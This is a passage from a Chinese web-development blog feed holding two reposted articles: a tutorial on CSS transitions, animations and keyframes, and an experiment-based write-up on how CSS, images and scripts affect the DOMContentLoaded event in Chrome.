<h2 id="第一部分：CSS-Transition"><a href="#第一部分：CSS-Transition" class="headerlink" title="第一部分：CSS Transition"></a>第一部分：CSS Transition</h2><h3 id="1-1-基本用法"><a href="#1-1-基本用法" class="headerlink" title="1.1 基本用法"></a>1.1 基本用法</h3><p><strong>在CSS 3引入Transition（过渡）这个概念之前，CSS是没有时间轴的。也就是说，所有的状态变化，都是即时完成。</strong></p>
<p>上面是一个演示，当鼠标放置于缩略图之上，缩略图会迅速变大。注意，缩略图的变大是瞬间实现的。下面是代码，相当简单。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">height</span>:<span class="number">15px</span>;</div><div class="line">    <span class="attribute">width</span>:<span class="number">15px</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-tag">img</span><span class="selector-pseudo">:hover</span>&#123;</div><div class="line">    <span class="attribute">height</span>: <span class="number">450px</span>;</div><div class="line">    <span class="attribute">width</span>: <span class="number">450px</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>transition的作用在于，指定状态变化所需要的时间。</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面代码指定，图片放大的过程需要1秒，效果如下。</p>
<p>我们还可以指定transition适用的属性，比如只适用于height。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> height;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这样一来，只有height的变化需要1秒实现，其他变化（主要是width）依然瞬间实现，效果如下。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="1-2-transition-delay"><a href="#1-2-transition-delay" class="headerlink" title="1.2 transition-delay"></a>1.2 transition-delay</h3><p>在同一行transition语句中，可以分别指定多个属性。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> height, <span class="number">1s</span> width;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>但是，这样一来，height和width的变化是同时进行的，跟不指定它们没有差别，效果如下。</p>
<p>我们希望，让height先发生变化，等结束以后，再让width发生变化。实现这一点很容易，就是为width指定一个delay参数。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> height, <span class="number">1s</span> <span class="number">1s</span> width;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面代码指定，width在1秒之后，再开始变化，也就是延迟（delay）1秒，效果如下。</p>
<p>delay的真正意义在于，它指定了动画发生的顺序，使得多个不同的transition可以连在一起，形成复杂效果。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="1-3-transition-timing-function"><a href="#1-3-transition-timing-function" class="headerlink" title="1.3 transition-timing-function"></a>1.3 transition-timing-function</h3><p>transition的状态变化速度（又称timing function），默认不是匀速的，而是逐渐放慢，这叫做ease。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> ease;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>除了ease以外，其他模式还包括</p>
<blockquote>
<p>（1）linear：匀速</p>
<p>（2）ease-in：加速</p>
<p>（3）ease-out：减速</p>
<p>（4）cubic-bezier函数：自定义速度模式</p>
</blockquote>
<p>最后那个cubic-bezier，可以使用<a href="http://cubic-bezier.com/" target="_blank" rel="external">工具网站</a>来定制。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> height <span class="built_in">cubic-bezier</span>(.83,.97,.05,1.44);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面的代码会产生一个最后阶段放大过度、然后回缩的效果。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="1-4-transition的各项属性"><a href="#1-4-transition的各项属性" class="headerlink" title="1.4 transition的各项属性"></a>1.4 transition的各项属性</h3><p>transition的完整写法如下。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> <span class="number">1s</span> height ease;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这其实是一个简写形式，可以单独定义成各个属性。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition-property</span>: height;</div><div class="line">    <span class="attribute">transition-duration</span>: <span class="number">1s</span>;</div><div class="line">    <span class="attribute">transition-delay</span>: <span class="number">1s</span>;</div><div class="line">    <span class="attribute">transition-timing-function</span>: ease;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="1-5-transition的使用注意"><a href="#1-5-transition的使用注意" class="headerlink" title="1.5 transition的使用注意"></a>1.5 transition的使用注意</h3><p>（1）目前，各大浏览器（包括IE 10）都已经支持无前缀的transition，所以transition已经可以很安全地不加浏览器前缀。</p>
<p>（2）不是所有的CSS属性都支持transition，完整的列表查看<a href="http://oli.jp/2010/css-animatable-properties/" target="_blank" rel="external">这里</a>，以及具体的<a href="http://leaverou.github.io/animatable/" target="_blank" rel="external">效果</a>。</p>
<p>（3）<strong>transition需要明确知道，开始状态和结束状态的具体数值，才能计算出中间状态。比如，height从0px变化到100px，transition可以算出中间状态。但是，transition没法算出0px到auto的中间状态，也就是说，如果开始或结束的设置是height: auto，那么就不会产生动画效果。类似的情况还有，display: none到block，background: url(foo.jpg)到url(bar.jpg)等等。</strong></p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="1-6-transition的局限"><a href="#1-6-transition的局限" class="headerlink" title="1.6 transition的局限"></a>1.6 transition的局限</h3><p>transition的优点在于简单易用，但是它有几个很大的局限。</p>
<p>（1）<strong>transition需要事件触发，所以没法在网页加载时自动发生。</strong></p>
<p>（2）<strong>transition是一次性的，不能重复发生，除非一再触发。</strong></p>
<p>（3）<strong>transition只能定义开始状态和结束状态，不能定义中间状态，也就是说只有两个状态。</strong></p>
<p>（4）<strong>一条transition规则，只能定义一个属性的变化，不能涉及多个属性。</strong></p>
<p>CSS Animation就是为了解决这些问题而提出的。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h2 id="第二部分：CSS-Animation"><a href="#第二部分：CSS-Animation" class="headerlink" title="第二部分：CSS Animation"></a>第二部分：CSS Animation</h2><h3 id="2-1-基本用法"><a href="#2-1-基本用法" class="headerlink" title="2.1 基本用法"></a>2.1 基本用法</h3><p>首先，CSS Animation需要指定动画一个周期持续的时间，以及动画效果的名称。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面代码表示，当鼠标悬停在div元素上时，会产生名为rainbow的动画效果，持续时间为1秒。为此，我们还需要用keyframes关键字，定义rainbow效果。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  0% &#123; <span class="attribute">background</span>: <span class="number">#c00</span>; &#125;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange; &#125;</div><div class="line">  100% &#123; <span class="attribute">background</span>: yellowgreen; &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面代码表示，rainbow效果一共有三个状态，分别为起始（0%）、中点（50%）和结束（100%）。如果有需要，完全可以插入更多状态。效果如下。</p>
<p>默认情况下，动画只播放一次。加入infinite关键字，可以让动画无限次播放。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow infinite;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>也可以指定动画具体播放的次数，比如3次。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow <span class="number">3</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里还有一个<a href="http://lea.verou.me/css-4d/#heart-demo" target="_blank" rel="external">心脏跳动</a>的例子，可供参考。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-2-animation-fill-mode"><a href="#2-2-animation-fill-mode" class="headerlink" title="2.2 animation-fill-mode"></a>2.2 animation-fill-mode</h3><p><strong>动画结束以后，会立即从结束状态跳回到起始状态。如果想让动画保持在结束状态，需要使用animation-fill-mode属性。</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow forwards;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>forwards表示让动画停留在结束状态</strong>，效果如下。</p>
<p>animation-fill-mode还可以使用下列值。</p>
<blockquote>
<p>（1）none：默认值，回到动画没开始时的状态。</p>
<p>（2）backwards：让动画回到第一帧的状态。</p>
<p>（3）both: 根据animation-direction（见后）轮流应用forwards和backwards规则。</p>
</blockquote>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-3-animation-direction"><a href="#2-3-animation-direction" class="headerlink" title="2.3 animation-direction"></a>2.3 animation-direction</h3><p>动画循环播放时，每次都是从结束状态跳回到起始状态，再开始播放。animation-direction属性，可以改变这种行为。</p>
<p>下面看一个例子，来说明如何使用animation-direction。假定有一个动画是这样定义的。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  0% &#123; <span class="attribute">background-color</span>: yellow; &#125;</div><div class="line">  100% &#123; <span class="attribute">background</span>: blue; &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>默认情况是，animation-direction等于normal。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow <span class="number">3</span> normal;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>此外，还可以等于取alternate、reverse、alternate-reverse等值。它们的含义见下图（假定动画连续播放三次）。</p>
<p><img src="http://image.beekka.com/blog/201402/bg2014021401.png" alt="img"></p>
<p>简单说，<strong>animation-direction指定了动画播放的方向，最常用的值是normal和reverse。浏览器对其他值的支持情况不佳，应该慎用。</strong></p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-4-animation的各项属性"><a href="#2-4-animation的各项属性" class="headerlink" title="2.4 animation的各项属性"></a>2.4 animation的各项属性</h3><p>同transition一样，animation也是一个简写形式。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> <span class="number">1s</span> rainbow linear <span class="number">3</span> forwards normal;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这是一个简写形式，可以分解成各个单独的属性。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation-name</span>: rainbow;</div><div class="line">  <span class="attribute">animation-duration</span>: <span class="number">1s</span>;</div><div class="line">  <span class="attribute">animation-timing-function</span>: linear;</div><div class="line">  <span class="attribute">animation-delay</span>: <span class="number">1s</span>;</div><div class="line">    <span class="attribute">animation-fill-mode</span>:forwards;</div><div class="line">  <span class="attribute">animation-direction</span>: normal;</div><div class="line">  <span class="attribute">animation-iteration-count</span>: <span class="number">3</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-5-keyframes的写法"><a href="#2-5-keyframes的写法" class="headerlink" title="2.5 keyframes的写法"></a>2.5 keyframes的写法</h3><p>keyframes关键字用来定义动画的各个状态，它的写法相当自由。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  0% &#123; <span class="attribute">background</span>: <span class="number">#c00</span> &#125;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange &#125;</div><div class="line">  100% &#123; <span class="attribute">background</span>: yellowgreen &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>0%可以用from代表，100%可以用to代表</strong>，因此上面的代码等同于下面的形式。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  <span class="selector-tag">from</span> &#123; <span class="attribute">background</span>: <span class="number">#c00</span> &#125;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange &#125;</div><div class="line">  <span class="selector-tag">to</span> &#123; <span class="attribute">background</span>: yellowgreen &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>如果省略某个状态，浏览器会自动推算中间状态</strong>，所以下面都是合法的写法。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange &#125;</div><div class="line">  <span class="selector-tag">to</span> &#123; <span class="attribute">background</span>: yellowgreen &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  <span class="selector-tag">to</span> &#123; <span class="attribute">background</span>: yellowgreen &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>甚至，可以把多个状态写在一行。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> pound &#123;</div><div class="line">  <span class="selector-tag">from</span>，<span class="selector-tag">to</span> &#123; <span class="attribute">transform</span>: none; &#125;</div><div class="line">  50% &#123; <span class="attribute">transform</span>: <span class="built_in">scale</span>(1.2); &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>另外一点需要注意的是，浏览器从一个状态向另一个状态过渡，是平滑过渡。<code>steps</code> 函数可以实现<strong>分步过渡</strong>。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow infinite <span class="built_in">steps</span>(10);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里有一个非常神奇的<a href="http://dabblet.com/gist/1745856" target="_blank" rel="external">例子</a>，可以看到steps函数的用处。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-6-animation-play-state"><a href="#2-6-animation-play-state" class="headerlink" title="2.6 animation-play-state"></a>2.6 animation-play-state</h3><p>有时，<strong>动画播放过程中，会突然停止</strong>。这时，<strong>默认行为是跳回到动画的开始状态。</strong></p>
<p>上面动画中，如果鼠标移走，色块立刻回到动画开始状态。</p>
<p><strong>如果想让动画保持突然终止时的状态，就要使用animation-play-state属性</strong>。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span> &#123;</div><div class="line">    <span class="attribute">animation</span>: spin <span class="number">1s</span> linear infinite;</div><div class="line">    <span class="attribute">animation-play-state</span>: paused;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation-play-state</span>: running;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面的代码指定，没有鼠标没有悬停时，动画状态是暂停；一旦悬停，动画状态改为继续播放。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-7-浏览器前缀"><a href="#2-7-浏览器前缀" class="headerlink" title="2.7 浏览器前缀"></a>2.7 浏览器前缀</h3><p>目前，IE 10和Firefox（&gt;= 16）支持没有前缀的animation，而chrome不支持，所以必须使用webkit前缀。</p>
<p>也就是说，实际运用中，代码必须写成下面的样子。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">-webkit-animation</span>: <span class="number">1s</span> rainbow;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow;  </div><div class="line">&#125;</div><div class="line"></div><div class="line">@-<span class="keyword">webkit</span>-<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  0% &#123; <span class="attribute">background</span>: <span class="number">#c00</span>; &#125;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange; &#125;</div><div class="line">  100% &#123; <span class="attribute">background</span>: yellowgreen; &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  0% &#123; <span class="attribute">background</span>: <span class="number">#c00</span>; &#125;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange; &#125;</div><div class="line">  100% &#123; <span class="attribute">background</span>: yellowgreen; &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<p><br></p>
<p>-end-</p>
<p>原文地址: <a href="http://www.ruanyifeng.com/blog/2014/02/css_transition_and_animation.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2014/02/css_transition_and_animation.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSS动画简介&quot;&gt;&lt;a href=&quot;#CSS动画简介&quot; class=&quot;headerlink&quot; title=&quot;CSS动画简介&quot;&gt;&lt;/a&gt;CSS动画简介&lt;/h2&gt;&lt;p&gt;作者： &lt;a href=&quot;http://www.ruanyifeng.com/&quot; target=&quot;_
    
    </summary>
    
      <category term="CSS" scheme="http://www.wanglinzhizhi.me/categories/CSS/"/>
    
    
      <category term="CSS3" scheme="http://www.wanglinzhizhi.me/tags/CSS3/"/>
    
      <category term="CSS" scheme="http://www.wanglinzhizhi.me/tags/CSS/"/>
    
      <category term="CSS3动画" scheme="http://www.wanglinzhizhi.me/tags/CSS3%E5%8A%A8%E7%94%BB/"/>
    
      <category term="阮一峰" scheme="http://www.wanglinzhizhi.me/tags/%E9%98%AE%E4%B8%80%E5%B3%B0/"/>
    
  </entry>
  
  <entry>
    <title>JS、CSS以及img对DOMContentLoaded事件的影响</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/DOMContent/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/DOMContent/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JS、CSS以及img对DOMContentLoaded事件的影响"><a href="#JS、CSS以及img对DOMContentLoaded事件的影响" class="headerlink" title="JS、CSS以及img对DOMContentLoaded事件的影响"></a>JS、CSS以及img对DOMContentLoaded事件的影响</h2><p>In <a href="http://www.alloyteam.com/webdevelop/web-%e5%89%8d%e7%ab%af%e4%bc%98%e5%8c%96/" target="_blank" rel="external">Web 前端优化</a>,<a href="http://www.alloyteam.com/webdevelop/" target="_blank" rel="external">Web开发</a> </p>
<p>on 2014年03月03日 by <a href="http://www.alloyteam.com/author/kerry95/" target="_blank" rel="external">TAT.kerry95</a> view: 17,634<a href="http://www.alloyteam.com/2014/03/effect-js-css-and-img-event-of-domcontentloaded/#comments" target="_blank" rel="external">12</a></p>
<p>最近在做性能有关的数据上报，发现了两个非常有意思的东西：Chrome开发者工具的Timeline分析面板，以及DOMContentLoaded事件。一个是强大的令人发指的性能分析工具，一个是重要的性能指标，于是就用Timeline对DOMContentLoaded事件进行了一番研究。</p>
<h2 id="前端的纯技术就是对规范的认知"><a href="#前端的纯技术就是对规范的认知" class="headerlink" title="前端的纯技术就是对规范的认知"></a>前端的纯技术就是对规范的认知</h2><p>什么是DOMContentLoaded事件？</p>
<p>首先想到的是查看<a href="http://www.w3.org/TR/html5/syntax.html#the-end" target="_blank" rel="external">W3C的HTML5规范</a>，DOMContentLoaded事件在什么时候触发：</p>
<blockquote>
<p>Once the user agent stops parsing the document, the user agent must run the following steps:<br>\1. Set the current document readiness to “interactive” and the insertion point to undefined.<br>Pop all the nodes off the stack of open elements.<br>\2. If the list of scripts that will execute when the document has finished parsing is not empty, run these substeps:<br>2.1 Spin the event loop until the first script in the list of scripts that will execute when the document has finished parsing has its “ready to be parser-executed” flag set and the parser’s Document has no style sheet that is blocking scripts.<br>2.2 Execute the first script in the list of scripts that will execute when the document has finished parsing.<br>2.3 Remove the first script element from the list of scripts that will execute when the document has finished parsing (i.e. shift out the first entry in the list).<br>2.4 If the list of scripts that will execute when the document has finished parsing is still not empty, repeat these substeps again from substep 1.<br>\3. Queue a task to fire a simple event that bubbles named <strong>DOMContentLoaded</strong> at the Document.</p>
</blockquote>
<p>规范总是那么的晦涩，但至少有一点是可以明确了的，就是在JS（不包括动态插入的JS）执行完之后，才会触发DOMContentLoaded事件。</p>
<p>接下来看看<a href="https://developer.mozilla.org/en-US/docs/Web/Reference/Events/DOMContentLoaded" target="_blank" rel="external">MDN上有关DOMContentLoaded事件的文档</a>：</p>
<blockquote>
<p>The DOMContentLoaded event is fired when the document has been completely loaded and parsed, without waiting for stylesheets, images, and subframes to finish loading<br>Note: Stylesheet loads block script execution, so if you have a <code>after a</code>, the page will not finish parsing – and DOMContentLoaded will not fire – until the stylesheet is loaded.</p>
</blockquote>
<p>这么看来，至少可以得出这么一个理论：DOMContentLoaded事件本身不会等待CSS文件、图片、iframe加载完成。<br>它的触发时机是：加载完页面，解析完所有标签（不包括执行CSS和JS），并如规范中所说的设置<code>interactive</code> 和执行每个静态的script标签中的JS，然后触发。<br>而JS的执行，需要等待位于它前面的CSS加载（如果是外联的话）、执行完成，因为JS可能会依赖位于它前面的CSS计算出来的样式。</p>
<h2 id="实践是检验真理的唯一标准"><a href="#实践是检验真理的唯一标准" class="headerlink" title="实践是检验真理的唯一标准"></a>实践是检验真理的唯一标准</h2><h3 id="实验1：DOMContentLoaded事件不直接等待CSS文件、图片的加载完成"><a href="#实验1：DOMContentLoaded事件不直接等待CSS文件、图片的加载完成" class="headerlink" title="实验1：DOMContentLoaded事件不直接等待CSS文件、图片的加载完成"></a>实验1：DOMContentLoaded事件不直接等待CSS文件、图片的加载完成</h3><p>index.html:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"./css/main.css"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/chrome-girl.jpg"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/2014/03/71fca778-a249-11e3-8824-2aae4440c857.png" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/2014/03/71fca778-a249-11e3-8824-2aae4440c857.png" alt="71fca778-a249-11e3-8824-2aae4440c857"></a><br>图一</p>
<p>如果页面中没有script标签，DOMContentLoaded事件并没有等待CSS文件、图片加载完成。</p>
<p>Chrome开发者工具的Timeline面板可以帮我们记录下浏览器的一举一动。图一中红色小方框中的蓝线，表示DOMContentLoaded事件，它右边的红线和绿线分别表示load事件和First paint，鼠标hover在这些线露出灰色方框下面的一小部分时就会出现带有说明文字的tips（这交互够反人类的对吧！）。</p>
<h3 id="实验2：DOMContentLoaded事件需要等待JS执行完才触发"><a href="#实验2：DOMContentLoaded事件需要等待JS执行完才触发" class="headerlink" title="实验2：DOMContentLoaded事件需要等待JS执行完才触发"></a>实验2：DOMContentLoaded事件需要等待JS执行完才触发</h3><p>index.html:<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">        <span class="built_in">console</span>.timeStamp(<span class="string">'Inline script before link in head'</span>);</div><div class="line">        <span class="built_in">window</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">            <span class="built_in">console</span>.timeStamp(<span class="string">'DOMContentLoaded event'</span>);</div><div class="line">        &#125;);</div><div class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"./css/main.css"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">        <span class="built_in">console</span>.timeStamp(<span class="string">'Inline script after link in head'</span>);</div><div class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/chrome-girl.jpg"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./js/main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>main.js:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="built_in">console</span>.timeStamp(<span class="string">'External script after link in body'</span>);</div></pre></td></tr></table></figure>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/2014/03/dcf399e8-a252-11e3-92c1-c3dbad820909.png" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/2014/03/dcf399e8-a252-11e3-92c1-c3dbad820909.png" alt="dcf399e8-a252-11e3-92c1-c3dbad820909"></a></p>
<p>图二</p>
<p>如果页面中静态的写有script标签，DOMContentLoaded事件需要等待JS执行完才触发。<br>而script标签中的JS需要等待位于其前面的CSS的加载完成。</p>
<p><code>console.timeStamp()</code> 可以向Timeline中添加一条记录，并对应上方的一条黄线。</p>
<p>从图二中可以看出，在CSS之前的JS立刻得到了执行，而在CSS之后的JS，需要等待CSS加载完后才执行，比较明显的是main.js早就加载完了，但还是要等main.css加载完才能执行。而DOMContentLoaded事件，则是在JS执行完后才触发。滑动Timeline面板中表示展示区域的滑块，如图三，放大后即可看到表示DOMContentLoaded事件的蓝线（之前跟黄线和绿线靠的太近了），当然，通过<code>console.timeStamp()</code> 向TimeLine中添加的记录也可证明其触发时间。</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/2014/03/910b5c2c-a253-11e3-995d-e19fb254cf4e.png" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/2014/03/910b5c2c-a253-11e3-995d-e19fb254cf4e.png" alt="910b5c2c-a253-11e3-995d-e19fb254cf4e"></a><br>图三</p>
